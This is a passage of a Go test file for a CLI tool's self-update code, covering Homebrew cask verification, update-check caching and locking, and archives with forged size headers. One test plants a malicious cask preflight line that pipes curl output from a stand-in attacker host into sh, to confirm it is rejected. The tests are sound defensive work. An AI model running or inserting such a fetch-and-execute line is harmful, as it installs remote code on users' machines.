			_, _ = w.Write(caskRaw)
			return
		}
		http.NotFound(w, request)
	}))
	defer server.Close()
	descriptor := releaseDescriptor{Version: "1.2.3", Assets: map[string]releaseAsset{
		"ecctl_1.2.3_cask.rb":             {Name: "ecctl_1.2.3_cask.rb", SHA256: digestBytes(caskRaw), URL: server.URL + "/assets/ecctl_1.2.3_cask.rb"},
		"ecctl_1.2.3_darwin_amd64.tar.gz": {SHA256: intelSHA},
		"ecctl_1.2.3_darwin_arm64.tar.gz": {SHA256: armSHA},
	}}
	var calls []string
	runner := func(_ context.Context, env []string, name string, args ...string) ([]byte, error) {
		call := strings.Join(append([]string{name}, args...), " ")
		calls = append(calls, call)
		switch {
		case len(args) == 1 && args[0] == "--prefix":
			return []byte(prefix + "\n"), nil
		case len(args) == 1 && args[0] == "--caskroom":
			return []byte(filepath.Join(prefix, "Caskroom") + "\n"), nil
		case len(args) > 0 && args[0] == "upgrade":
			if len(args) != 4 || args[1] != "--cask" || !filepath.IsAbs(args[2]) || !strings.Contains(args[2], string(filepath.Separator)) || args[3] != "--quiet" {
				return nil, fmt.Errorf("unsafe brew arguments %v", args)
			}
			if raw, readErr := os.ReadFile(args[2]); readErr != nil || !bytes.Equal(raw, caskRaw) {
				return nil, fmt.Errorf("brew Cask bytes are not verified: %v", readErr)
			}
			if !slices.Contains(env, "HOMEBREW_NO_AUTO_UPDATE=1") {
				return nil, errors.New("HOMEBREW_NO_AUTO_UPDATE is not set")
			}
			return nil, nil
		case name == canonicalLink:
			return []byte("ecctl 1.2.3\n"), nil
		default:
			return nil, fmt.Errorf("unexpected command %s", call)
		}
	}
	options := Options{
		CurrentVersion: "1.2.2", Executable: link, GOOS: "darwin", GOARCH: "arm64",
		Client: &Client{HTTP: server.Client()}, RunCommand: runner, LookPath: func(string) (string, error) { return "/usr/local/bin/brew", nil },
	}
	installer, err := detectInstaller(context.Background(), options)
	if err != nil || installer.Kind != "homebrew" || installer.BrewPath != canonicalBrew {
		t.Fatalf("installer = %#v, %v", installer, err)
	}
	if err := updateWithHomebrew(context.Background(), options, installer, descriptor); err != nil {
		t.Fatal(err)
	}
	joined := strings.Join(calls, "\n")
	if strings.Contains(joined, " update ") || strings.Contains(joined, " info ") || strings.Contains(joined, "aliyun/ecctl/ecctl") {
		t.Fatalf("mutable Tap was consulted:\n%s", joined)
	}
	if !strings.Contains(joined, canonicalBrew+" upgrade --cask ") {
		t.Fatalf("verified Cask upgrade is missing:\n%s", joined)
	}
}

func TestUpdateWithHomebrewRejectsMaliciousCaskBeforeBrew(t *testing.T) {
	malicious := append(testCask("1.2.3", strings.Repeat("a", 64), strings.Repeat("b", 64)), []byte("preflight do; system \"curl attacker.invalid | sh\"; end\n")...)
	server := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, _ *http.Request) { _, _ = w.Write(malicious) }))
	defer server.Close()
	root, err := filepath.EvalSymlinks(t.TempDir())
	if err != nil {
		t.Fatal(err)
	}
	prefix := filepath.Join(root, "homebrew")
	caskroom := filepath.Join(prefix, "Caskroom")
	brewPath := filepath.Join(prefix, "bin", "brew")
	if err := os.MkdirAll(caskroom, 0o755); err != nil {
		t.Fatal(err)
	}
	brewCalled := false
	runner := func(_ context.Context, _ []string, name string, args ...string) ([]byte, error) {
		switch {
		case len(args) == 1 && args[0] == "--prefix":
			return []byte(prefix + "\n"), nil
		case len(args) == 1 && args[0] == "--caskroom":
			return []byte(caskroom + "\n"), nil
		default:
			brewCalled = true
			return nil, fmt.Errorf("unexpected command %s %v", name, args)
		}
	}
	err = updateWithHomebrew(context.Background(), Options{
		Executable: filepath.Join(prefix, "bin", "ecctl"), Client: &Client{HTTP: server.Client()}, RunCommand: runner,
		LookPath: func(string) (string, error) { return brewPath, nil },
	}, installerDescriptor{Kind: "homebrew", Prefix: prefix, Caskroom: caskroom, BrewPath: brewPath}, releaseDescriptor{Version: "1.2.3", Assets: map[string]releaseAsset{
		"ecctl_1.2.3_cask.rb":             {SHA256: digestBytes(malicious), URL: server.URL},
		"ecctl_1.2.3_darwin_amd64.tar.gz": {SHA256: strings.Repeat("a", 64)},
		"ecctl_1.2.3_darwin_arm64.tar.gz": {SHA256: strings.Repeat("b", 64)},
	}})
	if err == nil || ErrorKindOf(err) != ErrorIntegrity || brewCalled {
		t.Fatalf("malicious Cask error = %v, kind=%q, brewCalled=%t", err, ErrorKindOf(err), brewCalled)
	}
}

func TestDetectInstallerFailsClosedForCaskroomWithoutDerivedBrew(t *testing.T) {
	root := t.TempDir()
	prefix := filepath.Join(root, "homebrew")
	executable := filepath.Join(prefix, "Caskroom", "ecctl", "1.2.3", "ecctl")
	if err := os.MkdirAll(filepath.Dir(executable), 0o755); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(executable, []byte("binary"), 0o755); err != nil {
		t.Fatal(err)
	}
	descriptor, err := detectInstaller(context.Background(), Options{
		Executable: executable, GOOS: "darwin", RunCommand: runCommand,
		LookPath: func(string) (string, error) { return "/usr/local/bin/brew", nil },
	})
	if err == nil || descriptor.Kind == "direct" {
		t.Fatalf("descriptor = %#v, error = %v", descriptor, err)
	}
}

func TestDetectInstallerRejectsMismatchedDerivedBrewLayout(t *testing.T) {
	root := t.TempDir()
	prefix := filepath.Join(root, "homebrew")
	executable := filepath.Join(prefix, "Caskroom", "ecctl", "1.2.3", "ecctl")
	brew := filepath.Join(prefix, "bin", "brew")
	if err := os.MkdirAll(filepath.Dir(executable), 0o755); err != nil {
		t.Fatal(err)
	}
	if err := os.MkdirAll(filepath.Dir(brew), 0o755); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(executable, []byte("binary"), 0o755); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(brew, []byte("#!/bin/sh\n"), 0o755); err != nil {
		t.Fatal(err)
	}
	runner := func(_ context.Context, _ []string, name string, args ...string) ([]byte, error) {
		if name != brew {
			return nil, fmt.Errorf("used PATH brew %s", name)
		}
		if len(args) == 1 && args[0] == "--prefix" {
			return []byte(prefix + "\n"), nil
		}
		if len(args) == 1 && args[0] == "--caskroom" {
			return []byte(filepath.Join(root, "wrong-Caskroom") + "\n"), nil
		}
		return nil, fmt.Errorf("unexpected args %v", args)
	}
	descriptor, err := detectInstaller(context.Background(), Options{
		Executable: executable, GOOS: "darwin", RunCommand: runner,
		LookPath: func(string) (string, error) { return "/usr/local/bin/brew", nil },
	})
	if err == nil || descriptor.Kind == "direct" {
		t.Fatalf("descriptor = %#v, error = %v", descriptor, err)
	}
}

func TestReplaceEnvironmentValueRemovesDuplicates(t *testing.T) {
	got := replaceEnvironmentValue([]string{"A=1", "HOMEBREW_NO_AUTO_UPDATE=0", "HOMEBREW_NO_AUTO_UPDATE=false"}, "HOMEBREW_NO_AUTO_UPDATE", "1")
	if strings.Join(got, ",") != "A=1,HOMEBREW_NO_AUTO_UPDATE=1" {
		t.Fatalf("environment = %v", got)
	}
}

func TestAutoCheckCachesAndThrottlesNotification(t *testing.T) {
	var requests atomic.Int32
	server := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		requests.Add(1)
		fmt.Fprintln(w, "1.2.3")
	}))
	defer server.Close()
	cachePath := filepath.Join(t.TempDir(), "update-check.json")
	now := time.Date(2026, 7, 20, 10, 0, 0, 0, time.UTC)
	client := &Client{HTTP: server.Client(), OSSBase: server.URL}
	options := AutoCheckOptions{CurrentVersion: "1.2.2", CachePath: cachePath, Client: client, Now: func() time.Time { return now }, MarkNotification: true}

	first, err := AutoCheck(context.Background(), options)
	if err != nil || !first.Available || !first.Notify {
		t.Fatalf("first AutoCheck = %#v, %v", first, err)
	}
	second, err := AutoCheck(context.Background(), options)
	if err != nil || !second.Available || second.Notify {
		t.Fatalf("second AutoCheck = %#v, %v", second, err)
	}
	if got := requests.Load(); got != 1 {
		t.Fatalf("requests = %d, want 1", got)
	}

	now = now.Add(25 * time.Hour)
	third, err := AutoCheck(context.Background(), options)
	if err != nil || !third.Notify {
		t.Fatalf("third AutoCheck = %#v, %v", third, err)
	}
	if got := requests.Load(); got != 2 {
		t.Fatalf("requests after expiry = %d, want 2", got)
	}
}

func TestAutoCheckSerializesNotificationMarking(t *testing.T) {
	server := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, _ *http.Request) {
		fmt.Fprintln(w, "1.2.3")
	}))
	defer server.Close()
	cachePath := filepath.Join(t.TempDir(), "update-check.json")
	now := time.Date(2026, 7, 20, 10, 0, 0, 0, time.UTC)
	base := AutoCheckOptions{
		CurrentVersion: "1.2.2", CachePath: cachePath,
		Client: &Client{HTTP: server.Client(), OSSBase: server.URL},
		Now:    func() time.Time { return now }, MarkNotification: true,
	}
	if _, err := AutoCheck(context.Background(), AutoCheckOptions{
		CurrentVersion: base.CurrentVersion, CachePath: base.CachePath, Client: base.Client, Now: base.Now,
	}); err != nil {
		t.Fatal(err)
	}
	start := make(chan struct{})
	const processes = 20
	results := make(chan AutoCheckResult, processes)
	errors := make(chan error, processes)
	for range processes {
		go func() {
			<-start
			result, err := AutoCheck(context.Background(), base)
			results <- result
			errors <- err
		}()
	}
	close(start)
	notifications := 0
	for range processes {
		if err := <-errors; err != nil {
			t.Fatal(err)
		}
		if (<-results).Notify {
			notifications++
		}
	}
	if notifications != 1 {
		t.Fatalf("notifications = %d, want exactly 1", notifications)
	}
}

func TestAutoCheckRecoversAfterTransientHighOSSVersion(t *testing.T) {
	latest := "999.0.0"
	server := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, _ *http.Request) {
		fmt.Fprintln(w, latest)
	}))
	defer server.Close()
	cachePath := filepath.Join(t.TempDir(), "update-check.json")
	now := time.Date(2026, 7, 20, 10, 0, 0, 0, time.UTC)
	options := AutoCheckOptions{
		CurrentVersion: "1.2.2", CachePath: cachePath,
		Client: &Client{HTTP: server.Client(), OSSBase: server.URL},
		Now:    func() time.Time { return now },
	}
	first, err := AutoCheck(context.Background(), options)
	if err != nil || first.LatestVersion != "999.0.0" {
		t.Fatalf("transient high AutoCheck = %#v, %v", first, err)
	}
	latest = "1.2.3"
	now = now.Add(autoCheckInterval + time.Hour)
	recovered, err := AutoCheck(context.Background(), options)
	if err != nil || recovered.LatestVersion != "1.2.3" || !recovered.Available {
		t.Fatalf("recovered AutoCheck = %#v, %v", recovered, err)
	}
}

func TestReadCacheRejectsOversizedAndNonRegularFiles(t *testing.T) {
	root := t.TempDir()
	large := filepath.Join(root, "large.json")
	if err := os.WriteFile(large, bytes.Repeat([]byte{'x'}, maxCacheBytes+1), 0o600); err != nil {
		t.Fatal(err)
	}
	if got := readCache(large); got != (cacheState{}) {
		t.Fatalf("oversized cache was read: %#v", got)
	}
	if got := readCache(root); got != (cacheState{}) {
		t.Fatalf("directory cache was read: %#v", got)
	}
}

func TestCacheLockIsReleasedWhenOwnerProcessExits(t *testing.T) {
	root := t.TempDir()
	cachePath := filepath.Join(root, "update-check.json")
	readyPath := filepath.Join(root, "ready")
	command := exec.Command(os.Args[0], "-test.run=TestCacheLockHelperProcess", "--", cachePath, readyPath)
	command.Env = append(os.Environ(), "ECCTL_CACHE_LOCK_HELPER=1")
	if err := command.Start(); err != nil {
		t.Fatal(err)
	}
	t.Cleanup(func() {
		if command.Process != nil {
			_ = command.Process.Kill()
			_, _ = command.Process.Wait()
		}
	})
	deadline := time.Now().Add(5 * time.Second)
	for {
		if _, err := os.Stat(readyPath); err == nil {
			break
		}
		if time.Now().After(deadline) {
			t.Fatal("helper did not acquire cache lock")
		}
		time.Sleep(10 * time.Millisecond)
	}
	unlock, locked, err := acquireCacheLock(cachePath)
	if err != nil {
		t.Fatal(err)
	}
	if locked {
		unlock()
		t.Fatal("second process acquired an owned cache lock")
	}
	if err := command.Process.Kill(); err != nil {
		t.Fatal(err)
	}
	_, _ = command.Process.Wait()
	command.Process = nil
	unlock, locked, err = acquireCacheLock(cachePath)
	if err != nil || !locked {
		t.Fatalf("lock after owner exit = %t, %v", locked, err)
	}
	unlock()
}

func TestCacheLockHelperProcess(t *testing.T) {
	if os.Getenv("ECCTL_CACHE_LOCK_HELPER") != "1" {
		return
	}
	separator := -1
	for index, arg := range os.Args {
		if arg == "--" {
			separator = index
			break
		}
	}
	if separator < 0 || len(os.Args) != separator+3 {
		os.Exit(2)
	}
	unlock, locked, err := acquireCacheLock(os.Args[separator+1])
	if err != nil || !locked {
		os.Exit(3)
	}
	defer unlock()
	if err := os.WriteFile(os.Args[separator+2], []byte("ready"), 0o600); err != nil {
		os.Exit(4)
	}
	for {
		time.Sleep(time.Hour)
	}
}

func TestAutoCheckBacksOffAfterFailure(t *testing.T) {
	var requests atomic.Int32
	server := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		requests.Add(1)
		http.Error(w, "unavailable", http.StatusServiceUnavailable)
	}))
	defer server.Close()
	cachePath := filepath.Join(t.TempDir(), "update-check.json")
	now := time.Date(2026, 7, 20, 10, 0, 0, 0, time.UTC)
	options := AutoCheckOptions{
		CurrentVersion: "1.2.2", CachePath: cachePath,
		Client: &Client{HTTP: server.Client(), OSSBase: server.URL},
		Now:    func() time.Time { return now },
	}
	if _, err := AutoCheck(context.Background(), options); err == nil {
		t.Fatal("first AutoCheck succeeded, want error")
	}
	now = now.Add(30 * time.Minute)
	if result, err := AutoCheck(context.Background(), options); err != nil || result.Available {
		t.Fatalf("backoff AutoCheck = %#v, %v", result, err)
	}
	if got := requests.Load(); got != 1 {
		t.Fatalf("requests = %d, want 1", got)
	}
}

func releaseServer(t *testing.T, archive []byte, ossUnavailable, corruptOSS bool) *httptest.Server {
	t.Helper()
	digest := sha256.Sum256(archive)
	checksum := hex.EncodeToString(digest[:])
	filename := "ecctl_1.2.3_darwin_arm64.tar.gz"
	checksums := checksum + "  " + filename + "\n"
	return httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		switch {
		case r.URL.Path == "/oss/version.txt":
			fmt.Fprintln(w, "1.2.3")
		case r.URL.Path == "/api/latest" || r.URL.Path == "/api/tags/v1.2.3":
			writeTestRelease(t, w, r, "1.2.3", false, false, true, map[string][]byte{
				"checksums.txt": []byte(checksums),
				filename:        archive,
			})
		case ossUnavailable && strings.HasPrefix(r.URL.Path, "/oss/1.2.3/"):
			http.Error(w, "unavailable", http.StatusServiceUnavailable)
		case r.URL.Path == "/oss/1.2.3/checksums.txt":
			fmt.Fprint(w, checksums)
		case r.URL.Path == "/oss/1.2.3/"+filename:
			if corruptOSS && strings.HasPrefix(r.URL.Path, "/oss/") {
				_, _ = w.Write([]byte("corrupt"))
				return
			}
			_, _ = w.Write(archive)
		case r.URL.Path == "/assets/"+filename:
			_, _ = w.Write(archive)
		default:
			http.NotFound(w, r)
		}
	}))
}

func writeTestRelease(t *testing.T, w http.ResponseWriter, request *http.Request, version string, draft, prerelease, immutable bool, content map[string][]byte) {
	writeTestReleaseTag(t, w, request, version, "v"+version, draft, prerelease, immutable, content)
}

func writeTestReleaseTag(t *testing.T, w http.ResponseWriter, request *http.Request, version, tag string, draft, prerelease, immutable bool, content map[string][]byte) {
	t.Helper()
	type asset struct {
		Name               string `json:"name"`
		State              string `json:"state"`
		Digest             string `json:"digest"`
		BrowserDownloadURL string `json:"browser_download_url"`
	}
	assets := make([]asset, 0, len(requiredReleaseAssets(version)))
	for _, name := range requiredReleaseAssets(version) {
		raw, ok := content[name]
		if !ok {
			raw = []byte("test asset " + name)
		}
		assets = append(assets, asset{
			Name: name, State: "uploaded", Digest: "sha256:" + digestBytes(raw),
			BrowserDownloadURL: "http://" + request.Host + "/assets/" + name,
		})
	}
	if err := json.NewEncoder(w).Encode(map[string]any{
		"tag_name": tag, "draft": draft, "prerelease": prerelease, "immutable": immutable, "assets": assets,
	}); err != nil {
		t.Fatal(err)
	}
}

func testCask(version, intelSHA256, armSHA256 string) []byte {
	verified := strings.TrimPrefix(releaseartifact.OSSBaseURL, "https://") + "/"
	return []byte(fmt.Sprintf(`# This file was generated by GoReleaser. DO NOT EDIT.
cask "ecctl" do
  version %q
  on_macos do
    on_intel do
      sha256 %q
      url %q,
        verified: %q
    end
    on_arm do
      sha256 %q
      url %q,
        verified: %q
    end
  end
  name "ecctl"
  desc %q
  homepage %q
  livecheck do
    skip "Auto-generated on release."
  end
  binary "ecctl"
  postflight do
    system_command "/usr/bin/xattr", args: ["-dr", "com.apple.quarantine", "#{staged_path}/ecctl"]
  end
end
`, version, intelSHA256,
		releaseartifact.OSSBaseURL+`/#{version}/ecctl_#{version}_darwin_amd64.tar.gz`, verified,
		armSHA256, releaseartifact.OSSBaseURL+`/#{version}/ecctl_#{version}_darwin_arm64.tar.gz`, verified,
		releaseartifact.Description, releaseartifact.Homepage))
}

func testTarGzip(t *testing.T, name string, content []byte) []byte {
	t.Helper()
	var buffer bytes.Buffer
	gzipWriter := gzip.NewWriter(&buffer)
	tarWriter := tar.NewWriter(gzipWriter)
	if err := tarWriter.WriteHeader(&tar.Header{Name: name, Mode: 0o755, Size: int64(len(content)), Typeflag: tar.TypeReg}); err != nil {
		t.Fatal(err)
	}
	if _, err := tarWriter.Write(content); err != nil {
		t.Fatal(err)
	}
	if err := tarWriter.Close(); err != nil {
		t.Fatal(err)
	}
	if err := gzipWriter.Close(); err != nil {
		t.Fatal(err)
	}
	return buffer.Bytes()
}

func testZip(t *testing.T, name string, content []byte) []byte {
	t.Helper()
	var buffer bytes.Buffer
	writer := zip.NewWriter(&buffer)
	file, err := writer.Create(name)
	if err != nil {
		t.Fatal(err)
	}
	if _, err := file.Write(content); err != nil {
		t.Fatal(err)
	}
	if err := writer.Close(); err != nil {
		t.Fatal(err)
	}
	return buffer.Bytes()
}

func testTarGzipEntries(t *testing.T, count int) []byte {
	t.Helper()
	var buffer bytes.Buffer
	gzipWriter := gzip.NewWriter(&buffer)
	tarWriter := tar.NewWriter(gzipWriter)
	for index := range count {
		name := fmt.Sprintf("file-%03d", index)
		if err := tarWriter.WriteHeader(&tar.Header{Name: name, Mode: 0o644, Size: 1, Typeflag: tar.TypeReg}); err != nil {
			t.Fatal(err)
		}
		if _, err := tarWriter.Write([]byte{'x'}); err != nil {
			t.Fatal(err)
		}
	}
	if err := tarWriter.Close(); err != nil {
		t.Fatal(err)
	}
	if err := gzipWriter.Close(); err != nil {
		t.Fatal(err)
	}
	return buffer.Bytes()
}

func testZipEntries(t *testing.T, count int) []byte {
	t.Helper()
	var buffer bytes.Buffer
	writer := zip.NewWriter(&buffer)
	for index := range count {
		file, err := writer.Create(fmt.Sprintf("file-%03d", index))
		if err != nil {
			t.Fatal(err)
		}
		if _, err := file.Write([]byte{'x'}); err != nil {
			t.Fatal(err)
		}
	}
	if err := writer.Close(); err != nil {
		t.Fatal(err)
	}
	return buffer.Bytes()
}

func forgeTarDeclaredSize(t *testing.T, size int64) []byte {
	t.Helper()
	original := testTarGzip(t, "padding", []byte{'x'})
	gzipReader, err := gzip.NewReader(bytes.NewReader(original))
	if err != nil {
		t.Fatal(err)
	}
	tarRaw, err := io.ReadAll(gzipReader)
	if err != nil {
		t.Fatal(err)
	}
	if err := gzipReader.Close(); err != nil {
		t.Fatal(err)
	}
	copy(tarRaw[124:136], fmt.Sprintf("%011o\x00", size))
	for index := 148; index < 156; index++ {
		tarRaw[index] = ' '
	}
	checksum := 0
	for _, value := range tarRaw[:512] {
		checksum += int(value)
	}
	copy(tarRaw[148:156], fmt.Sprintf("%06o\x00 ", checksum))
	var buffer bytes.Buffer
	gzipWriter := gzip.NewWriter(&buffer)
	if _, err := gzipWriter.Write(tarRaw); err != nil {
		t.Fatal(err)
	}
	if err := gzipWriter.Close(); err != nil {
		t.Fatal(err)
	}
	return buffer.Bytes()
}

func forgeZipDeclaredSize(t *testing.T, size int64) []byte {
	t.Helper()
	raw := append([]byte(nil), testZip(t, "padding", []byte{'x'})...)
	offset := bytes.Index(raw, []byte{'P', 'K', 1, 2})
	if offset < 0 || size > int64(^uint32(0)) {
		t.Fatalf("cannot forge ZIP size %d", size)
	}
	binary.LittleEndian.PutUint32(raw[offset+24:offset+28], uint32(size))
	return raw
}

type roundTripperFunc func(*http.Request) (*http.Response, error)

func (function roundTripperFunc) RoundTrip(request *http.Request) (*http.Response, error) {
	return function(request)
}

type errorReadCloser struct {
	err error
}

func (reader *errorReadCloser) Read([]byte) (int, error) { return 0, reader.err }
func (reader *errorReadCloser) Close() error             { return nil }

var _ io.ReadCloser = (*errorReadCloser)(nil)
